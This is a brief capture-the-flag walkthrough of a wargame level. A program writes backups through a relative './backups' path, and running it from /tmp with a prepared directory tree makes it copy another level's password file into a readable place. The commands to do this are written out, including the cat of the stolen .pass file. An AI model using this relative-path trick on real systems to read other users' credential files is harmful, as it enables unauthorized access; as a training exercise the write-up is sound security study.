We've started executing the binary to see what was asking.
We can also see that there is an empty folder named backup.

It asked for filename.

./level08 
Usage: ./level08 filename
ERROR: Failed to open (null)

So we've tried to give filename.

./level08 ~level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass

We've observed that it tried to open a relative path starting with "./backups".
The problem is that the backup folder in our directory is owned by level09 so we can't modify it.

We cd to the only folder we can write to: /tmp. We created a backups folder in /tmp and a test file.

Executing level08 in tmp with test as parameter we've seen that the program copied test in our backups.

~level08 test

ls backups/
test

So we've created the parent folder, changed test with the level09 directory containing the .pass file
and we got the flag.

mkdir -p ./backups/home/users/level09

~level08/level08 ~level09/.pass

cat backups/home/users/level09/.pass
